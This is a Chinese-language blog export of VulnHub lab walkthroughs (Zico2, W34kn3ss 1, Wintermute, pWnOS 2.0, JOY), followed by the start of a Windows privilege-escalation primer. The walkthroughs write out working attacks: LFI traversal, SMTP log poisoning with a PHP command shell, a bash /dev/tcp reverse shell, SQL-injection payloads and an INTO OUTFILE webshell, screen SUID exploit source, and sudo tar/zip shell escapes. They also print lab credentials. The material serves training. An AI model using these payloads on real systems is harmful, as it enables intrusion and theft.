<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.215 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.215 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/Zico2/1.png" alt="1"></p>
<p>80端口是最好的下手目标</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>查看主页，这里主页的链接非常少，很快就可以检查完</p>
<p><img src="/images/Zico2/2.png" alt="2"></p>
<p>主页没有太多有用的信息，但是仔细检查发现一处连接存在问题<br>从提交的参数来看是一处LFI，尝试利用</p>
<p><img src="/images/Zico2/3.png" alt="3"></p>
<p>利用成功</p>
<p><img src="/images/Zico2/9.png" alt="9"></p>
<p>查看源代码更好的显示，发现了用户名zico</p>
<p>接着进行目录扫描</p>
<p><img src="/images/Zico2/4.png" alt="4"></p>
<p>dbadmin非常显眼</p>
<p><img src="/images/Zico2/5.png" alt="5"></p>
<p>进去是phpLiteAdmin</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>尝试phpliteadmin弱口令登录，秘密admin成功登录</p>
<p><img src="/images/Zico2/6.png" alt="6"></p>
<p>该版本容易收到rce漏洞，但是先别急，目前已经存在了一个表，看看有什么信息</p>
<p><img src="/images/Zico2/7.png" alt="7"></p>
<p>获取两个账号和密码哈希，尝试破解</p>
<p><img src="/images/Zico2/8.png" alt="8"></p>
<p>直接尝试ssh登录</p>
<p><img src="/images/Zico2/10.png" alt="10"></p>
<p>竟然都登不上，那这组凭据暂时没有发挥的余地了</p>
<p>尝试24044.txt的RCE漏洞</p>
<p><img src="/images/Zico2/11.png" alt="11"></p>
<p>具体利用方式参考HTB:nineveh</p>
<p>找到我们的文件路径</p>
<p><img src="/images/Zico2/12.png" alt="12"></p>
<p>使用之前的LFI，即可获取shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.215&#x2F;view.php?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;databases&#x2F;evil</span><br></pre></td></tr></table></figure>

<p><img src="/images/Zico2/13.png" alt="13"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="方法1-脏牛"><a href="#方法1-脏牛" class="headerlink" title="方法1 脏牛"></a>方法1 脏牛</h3><p>40839.c</p>
<p><img src="/images/Zico2/14.png" alt="14"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40839.c -o exp -lcrypt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Zico2/15.png" alt="15"></p>
<p>有时候提权会卡在这，没关系，直接ssh过去就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh firefart@ip</span><br></pre></td></tr></table></figure>

<p><img src="/images/Zico2/16.png" alt="16"></p>
<h3 id="方法2-sudo"><a href="#方法2-sudo" class="headerlink" title="方法2 sudo"></a>方法2 sudo</h3><p>竟然是通过创建数据库getshell，那一定有数据库的连接密码<br>但这里有点坑， 我在/var/www下没找到</p>
<p>不过在home目录下的zico用户里发现了wordpress</p>
<p><img src="/images/Zico2/17.png" alt="17"></p>
<p>发现mysql密码</p>
<p><img src="/images/Zico2/18.png" alt="18"></p>
<p>这个密码能让我们切换到zico用户下</p>
<p><img src="/images/Zico2/19.png" alt="19"></p>
<p>发现sudo权限</p>
<p>tar</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo &#x2F;bin&#x2F;tar -cf &#x2F;dev&#x2F;null &#x2F;dev&#x2F;null --checkpoint&#x3D;1 --checkpoint-action&#x3D;exec&#x3D;&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>zip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TF&#x3D;$(mktemp -u)</span><br><span class="line">sudo &#x2F;usr&#x2F;bin&#x2F;zip $TF &#x2F;etc&#x2F;hosts -T -TT &#39;sh #&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Zico2/20.png" alt="20"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场W34kn3ss 1</title>
    <url>/2020/09/22/%E9%9D%B6%E5%9C%BAW34kn3ss-1/</url>
    <content><![CDATA[<h1 id="W34kn3ss-1"><a href="#W34kn3ss-1" class="headerlink" title="W34kn3ss 1"></a>W34kn3ss 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.216</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.216 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.216 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/W34kn3ss-1/1.png" alt="1"></p>
<p>扫描发现了一个域名，添加到host里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.1.216	weakness.jth</span><br></pre></td></tr></table></figure>

<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动访问，发现了一个信息 n30</p>
<p><img src="/images/W34kn3ss-1/2.png" alt="2"></p>
<p>接着进行目录枚举</p>
<p><img src="/images/W34kn3ss-1/3.png" alt="3"></p>
<p>发现了文件夹private，但是private里没有更多的信息，尝试进行子目录枚举</p>
<p><img src="/images/W34kn3ss-1/4.png" alt="4"></p>
<p>这次终于有所发现</p>
<p>发现了公钥</p>
<p><img src="/images/W34kn3ss-1/5.png" alt="5"></p>
<p>提示了openssl的版本</p>
<p><img src="/images/W34kn3ss-1/6.png" alt="6"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p><img src="/images/W34kn3ss-1/7.png" alt="7"></p>
<p>这个漏洞原理就不细说了，已经受过一次很长时间的苦了</p>
<p>首先确认位数，并提取md5指纹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -l -f authorized_keys</span><br><span class="line">ssh-keygen -l -E md5 -f authorized_keys |sed &#39;s&#x2F;:&#x2F;&#x2F;g&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/W34kn3ss-1/8.png" alt="8"></p>
<p>知道是2048位，直接去<a href="https://github.com/g0tmi1k/debian-ssh%E4%B8%8B%E8%BD%BD2048%EF%BC%8C%E5%B9%B6%E8%A7%A3%E5%8E%8B">https://github.com/g0tmi1k/debian-ssh下载2048，并解压</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -jxf debian_ssh_rsa_2048_x86.tar.bz2</span><br></pre></td></tr></table></figure>

<p>接着进入该目录，搜索与该md5指纹公钥匹配的私钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . |grep 4161de56829de2fe64b9055711f531c1</span><br></pre></td></tr></table></figure>

<p>使用刚刚发现的用户名，配合私钥就可以连接上去了</p>
<p><img src="/images/W34kn3ss-1/9.png" alt="9"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linpeas扫描，啥都没发现，这种情况需要手动发现一些linpeas无法枚举到的位置，比如home目录</p>
<p><img src="/images/W34kn3ss-1/10.png" alt="10"></p>
<p>发现了code，是一个pyc文件，把它传输到kali进行反变异</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install uncompyle6</span><br><span class="line">uncompyle6 code.pyc</span><br></pre></td></tr></table></figure>

<p><img src="/images/W34kn3ss-1/11.png" alt="11"></p>
<p>发现了一个密码<code>dMASDNB!!#B!#!#33</code>，看到之前linpeas的sudo -l没有枚举出来，可能是该账户的密码</p>
<p><img src="/images/W34kn3ss-1/12.png" alt="12"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Wintermute</title>
    <url>/2020/09/16/%E9%9D%B6%E5%9C%BAWintermute/</url>
    <content><![CDATA[<h1 id="Wintermute"><a href="#Wintermute" class="headerlink" title="Wintermute"></a>Wintermute</h1><p>kali:192.168.1.201<br>目标:192.168.1.245</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.245 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.245 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/Wintermute/1.png" alt="1"></p>
<p>有两个web服务80和3000</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动访问查看，80端口没什么东西，3000端口发现ntopng，但ntopng只找到XSS和CSRF漏洞</p>
<p>开始目录枚举</p>
<p>80端口</p>
<p><img src="/images/Wintermute/2png.png" alt="2png"></p>
<p>3000端口</p>
<p>真啥也没发现</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>ntopng发现了一个信息</p>
<p><img src="/images/Wintermute/3.png" alt="3"></p>
<p>直接提示了默认的登录凭据<code>admin/admin</code></p>
<p><img src="/images/Wintermute/4.png" alt="4"></p>
<p>在Flows下发现了<code>/turing-bolo/</code>和<code>/freeside/</code><br>其中<code>/freeside/</code>是之前枚举出的80端口目录，所以我们获得了另一个目录</p>
<p>访问它</p>
<p><img src="/images/Wintermute/5.png" alt="5"></p>
<p>点击query发现了一个这样的URL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.245&#x2F;turing-bolo&#x2F;bolo.php?bolo&#x3D;riviera</span><br></pre></td></tr></table></figure>

<p>看来是个文件包含</p>
<p>尝试了之后，发现好像读不了，那只能看看页面提供的信息了<br>在一处发现了提示</p>
<p><img src="/images/Wintermute/7.png" alt="7"></p>
<p>这里比较有意思，看来这的确是一个LFI漏洞，不过末尾是.log，我们无法通过一些常规截断的方式处理</p>
<p>为了确认我们的猜测可以尝试包含一个<code>*.log</code>文件，linux中的.log文件<a href="https://www.cnblogs.com/fuyusong/p/7537798.html">https://www.cnblogs.com/fuyusong/p/7537798.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.245&#x2F;turing-bolo&#x2F;bolo.php?bolo&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;dpkg</span><br></pre></td></tr></table></figure>

<p><img src="/images/Wintermute/8.png" alt="8"></p>
<p>成功使LFI成功</p>
<p>现在需要某个能输入的地方来污染某个.log的日志，且需要知道它的文件位置<br>想到之前还有个25端口没有使用</p>
<p>谷歌搜索<code>Postfix log location</code>可以找到<a href="https://askubuntu.com/questions/394724/where-are-the-postfix-log-files">https://askubuntu.com/questions/394724/where-are-the-postfix-log-files</a></p>
<p><img src="/images/Wintermute/9.png" alt="9"></p>
<p>尝试读取</p>
<p><img src="/images/Wintermute/10.png" alt="10"></p>
<p>读取成功，现在连接到smtp，尝试写入一些污染数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 192.168.1.245 25</span><br><span class="line">MAIL FROM: &quot;evil &lt;?php phpinfo(); system($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span><br><span class="line">RCPT TO: ROOT</span><br><span class="line">data						&#x2F;&#x2F;表示邮件内容</span><br><span class="line">evil	</span><br><span class="line">.							&#x2F;&#x2F;表示内容结束</span><br></pre></td></tr></table></figure>

<p>再次访问</p>
<p><img src="/images/Wintermute/11.png" alt="11"></p>
<p>phpinfo成功，并且shell也应该写入了</p>
<p>直接反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.201&#x2F;4444 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Wintermute/12.png" alt="12"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>提权有点小复杂</p>
<p><img src="/images/Wintermute/13.png" alt="13"></p>
<p>发现SUID screen-4.5.0</p>
<p><img src="/images/Wintermute/14.png" alt="14"></p>
<p>找到了41154.sh，照着它的步骤做</p>
<ol>
<li>kali中创建两个文件</li>
</ol>
<p>libhax.c</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;&#x2F;tmp&#x2F;rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;&#x2F;etc&#x2F;ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>rootshell.c</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>传输到对方的tmp目录</li>
<li>编译</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o &#x2F;tmp&#x2F;libhax.so &#x2F;tmp&#x2F;libhax.c</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o &#x2F;tmp&#x2F;rootshell &#x2F;tmp&#x2F;rootshell.c</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>继续跟着文档走</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;etc</span><br><span class="line">umask 000</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;libhax.so&quot;</span><br><span class="line">screen -ls</span><br><span class="line">&#x2F;tmp&#x2F;rootshell</span><br></pre></td></tr></table></figure>

<p><img src="/images/Wintermute/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场pWnOS 2.0</title>
    <url>/2020/09/14/%E9%9D%B6%E5%9C%BApWnOS-2-0/</url>
    <content><![CDATA[<h1 id="pWnOS2-0"><a href="#pWnOS2-0" class="headerlink" title="pWnOS2.0"></a>pWnOS2.0</h1><p>kali:192.168.1.201</p>
<p>目标:192.168.1.202</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.201 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.201 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/pWnOS2.0/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>对http服务进行枚举</p>
<p>nikto扫描</p>
<p><img src="/images/pWnOS2.0/2.png" alt="2"></p>
<p>目录枚举</p>
<p><img src="/images/pWnOS2.0/3.png" alt="3"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>手动检查页面能发现很多有价值的地方</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">login.php		 一个登录页面</span><br><span class="line">info.php		 phpinfo信息</span><br><span class="line">blog&#x2F;			 Powered by Simple PHP Blog 0.4.0</span><br></pre></td></tr></table></figure>

<h3 id="方法1-sql注入"><a href="#方法1-sql注入" class="headerlink" title="方法1 sql注入"></a>方法1 sql注入</h3><p>在login.php处是一个登录页面，我可以尝试一些常见的sql注入命令</p>
<p>比如用户名1’，密码1’</p>
<p><img src="/images/pWnOS2.0/4.png" alt="4"></p>
<p>直接连查询语句都出来了，接下来就可以针对这块来下手<br>这里注意，sql注入的触发需要<strong>用户名和密码</strong>都提交参数才行</p>
<h4 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h4><p><strong>确认字段数</strong></p>
<p>字段数为9会报错，尝试8成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 9#</span><br></pre></td></tr></table></figure>

<p><img src="/images/pWnOS2.0/5.png" alt="5"></p>
<p>得到字段数为8</p>
<p><strong>确认回显字段</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,3,4,5,6,7,8#</span><br></pre></td></tr></table></figure>

<p><img src="/images/pWnOS2.0/6.png" alt="6"></p>
<p>第4个字段回显</p>
<p>接下来就是常规操作</p>
<p><strong>爆库</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,3,database(),5,6,7,8#			</span><br></pre></td></tr></table></figure>

<p>ch16</p>
<p><strong>爆表</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,3,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;&quot;ch16&quot; limit 0,1),5,6,7,8# </span><br></pre></td></tr></table></figure>

<p>只有一张表users</p>
<p><strong>爆字段</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,3,(select column_name from information_schema.columns where table_schema&#x3D;&#39;ch16&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),5,6,7,8#</span><br></pre></td></tr></table></figure>

<p>关键的是email和pass</p>
<p><strong>爆数据</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,3,(select email from users limit 0,1),5,6,7,8#</span><br><span class="line">1&#39; union select 1,2,3,(select pass from users limit 0,1),5,6,7,8#</span><br></pre></td></tr></table></figure>

<p>得到<a href="mailto:&#x61;&#x64;&#x6d;&#105;&#x6e;&#64;&#x69;&#x73;&#x69;&#x6e;&#116;&#x73;&#x2e;&#99;&#111;&#x6d;">&#x61;&#x64;&#x6d;&#105;&#x6e;&#64;&#x69;&#x73;&#x69;&#x6e;&#116;&#x73;&#x2e;&#99;&#111;&#x6d;</a>和c2c4b4e51d9e23c02c15702c136c3e950ba9a4af<br>这个sha1比较难破解，john跑了rockyou没有破解，这里可以用somd5.com破解</p>
<p>得到killerbeesareflying</p>
<p>但是这个凭据仍然无法登录</p>
<p><img src="/images/pWnOS2.0/7.png" alt="7"></p>
<p>但这不表示是一个兔子洞，我们可以尝试其他方法，比如之前的引发错误的语句，发现了web的目录</p>
<p><img src="/images/pWnOS2.0/8.png" alt="8"></p>
<p>我们可以直接尝试写webshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;,2,3,4,5,6,7,8 into outfile &#39;&#x2F;var&#x2F;www&#x2F;evil.php&#39;#</span><br></pre></td></tr></table></figure>

<p><img src="/images/pWnOS2.0/9.png" alt="9"></p>
<p>这样我们就可以拿到shell了</p>
<p>补充另外的注入方式</p>
<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select updatexml(1,concat(0x7e,version(),0x7e),1)#</span><br><span class="line">1&#39; union select updatexml(1,concat(0x7e,(select+pass+from+users+limit+0,1),0x7e),1)#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select count(*),1,1,1,1,1,1,(concat(floor(rand(0)*2),&#39;@&#39;,(select version())))x from mysql.user group by x#</span><br></pre></td></tr></table></figure>

<p>布尔盲注和时间盲注不演示了，这里也可以，但太麻烦</p>
<h3 id="方法2-searchsploit"><a href="#方法2-searchsploit" class="headerlink" title="方法2 searchsploit"></a>方法2 searchsploit</h3><p><img src="/images/pWnOS2.0/10.png" alt="10"></p>
<h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unix&#x2F;webapp&#x2F;sphpblog_file_upload</span><br></pre></td></tr></table></figure>

<p><img src="/images/pWnOS2.0/11.png" alt="11"></p>
<p>开启verbose，这里没有反弹shell，但是创建了凭据</p>
<h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><p>1191脚本也可以创建凭据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl 1191.pl -h http:&#x2F;&#x2F;192.168.1.202&#x2F;blog -e 3 -U evil -P evil</span><br></pre></td></tr></table></figure>



<p>这样我们就可以成功登录，之后找到上传图片处<br>直接上传php的shell，不需要任何绕过，提示上传成功</p>
<p>现在需要去找shell，可以用nikto扫描一下这个CMS</p>
<p><img src="/images/pWnOS2.0/12.png" alt="12"></p>
<p>发现了images目录，shell就在这里</p>
<p><img src="/images/pWnOS2.0/13.png" alt="13"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="方法1内核提权"><a href="#方法1内核提权" class="headerlink" title="方法1内核提权"></a>方法1内核提权</h3><p>Ubuntu 11.04</p>
<p><img src="/images/pWnOS2.0/14.png" alt="14"></p>
<p>25444.c  介绍写的是centos，这里ubuntu也能用</p>
<p><img src="/images/pWnOS2.0/15.png" alt="15"></p>
<p>注意下文档提示的编译参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -O2 25444.c</span><br></pre></td></tr></table></figure>

<p><img src="/images/pWnOS2.0/16.png" alt="16"></p>
<h3 id="方法2密码复用"><a href="#方法2密码复用" class="headerlink" title="方法2密码复用"></a>方法2密码复用</h3><p>这里有坑，容易错过</p>
<p>在/var/www和/var下都有mysql连接文件，其中都有root的连接密码</p>
<p>两个都尝试的话，就可以发现root的密码为root@ISIntS</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场digitalworld.local: JOY</title>
    <url>/2020/05/27/%E9%9D%B6%E5%9C%BAdigitalworld-local-JOY/</url>
    <content><![CDATA[<h1 id="Digitalworld-local-JOY"><a href="#Digitalworld-local-JOY" class="headerlink" title="Digitalworld.local(JOY)"></a>Digitalworld.local(JOY)</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.231</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/joy/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>ftp枚举</p>
<p>发现两个目录download和upload</p>
<p><img src="/images/joy/2.jpg" alt="2"></p>
<p>在upload中，名为directory的文件发现了有趣的信息</p>
<p><img src="/images/joy/3.jpg" alt="3"></p>
<p>看上去是用户<code>Patrick</code>的目录，其中有一个名为version_control的文件看上去很可疑</p>
<h4 id="ProFTPD任意文件读取-CVE-2015-3306"><a href="#ProFTPD任意文件读取-CVE-2015-3306" class="headerlink" title="ProFTPD任意文件读取(CVE-2015-3306)"></a>ProFTPD任意文件读取(CVE-2015-3306)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 192.168.1.231 21</span><br><span class="line">site cpfr &#x2F;home&#x2F;patrick&#x2F;version_control			&#x2F;&#x2F;复制</span><br><span class="line">site cpto &#x2F;home&#x2F;ftp&#x2F;upload&#x2F;version_control		&#x2F;&#x2F;粘贴</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p><img src="/images/joy/4.jpg" alt="4"></p>
<p>之后就可以查看version_control了<br>不过这里有点费解<code>/home/ftp/upload/</code>这个目录是如何得到的</p>
<h4 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h4><p>使用nmap进行了一次UDP扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -Pn -A -sU -T4 -oN &#x2F;root&#x2F;Desktop&#x2F;UDPscan.tx 192.168.1.231</span><br></pre></td></tr></table></figure>

<p>发现161端口SNMP显示tftp工作于36969端口，侦听的目录是<code>/home/patrick</code></p>
<p><img src="/images/joy/5.jpg" alt="5"></p>
<p>之后使用tftp就可以下载该目录的文件了</p>
<p><img src="/images/joy/6.jpg" alt="6"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h4 id="ProFTPD-mod-copy-CVE-2019-12815"><a href="#ProFTPD-mod-copy-CVE-2019-12815" class="headerlink" title="ProFTPD_mod_copy(CVE-2019-12815)"></a>ProFTPD_mod_copy(CVE-2019-12815)</h4><p><img src="/images/joy/7.jpg" alt="7"></p>
<p>获取交互</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/joy/8.jpg" alt="8"></p>
<p>在改目录下发现了账号和密码<code>patrick:apollo098765</code></p>
<p>切换用户后，发现可以免密执行的文件</p>
<p><img src="/images/joy/9.jpg" alt="9"></p>
<p>上传本地提权文件</p>
<p><img src="/images/joy/10.jpg" alt="10"></p>
<p>路径移动</p>
<p><img src="/images/joy/11.jpg" alt="11"></p>
<p>执行提权文件即可</p>
<p><img src="/images/joy/12.jpg" alt="12"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows Privilege Escalation</title>
    <url>/2020/08/31/Windows-Privilege-Escalation/</url>
    <content><![CDATA[<h1 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="普通账户"><a href="#普通账户" class="headerlink" title="普通账户"></a>普通账户</h3><p>通常使用<strong>User accounts</strong>登录windows机器<br>windows默认中有一个本地<strong>Administrator</strong>账号<br>还有几个可能存在的默认账户(比如<strong>Guest</strong>)</p>
<h3 id="服务账户"><a href="#服务账户" class="headerlink" title="服务账户"></a>服务账户</h3><p><strong>service accounts</strong>用来启动服务，不用使用它登录windows<br>其中<strong>SYSTEM</strong>账户是一个默认的服务账户，它具有最高权限<br>其他默认服务账户包括NETWORK SERVICE和LOCAL SERVICE</p>
<h3 id="组"><a href="#组" class="headerlink" title="组"></a>组</h3><p>用户账户可以属于不同的组<br><strong>Groups</strong>可以方便的管理权限，如常见的组:Administrators,Users<br>还有一种组称为<strong>Pseudo-groups</strong>(比如Authenticated Users)，会根据其作用，动态调整组内的成员</p>
<h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><p>这里的资源指:目录或文件，注册表，服务<br>用户对于它们的权限基于<strong>access control list(ACL)</strong><br>ACL由<strong>aceess control entries(ACEs)组成</strong><br>ACE规定了重要用户(user和group)和其他用户的权限</p>
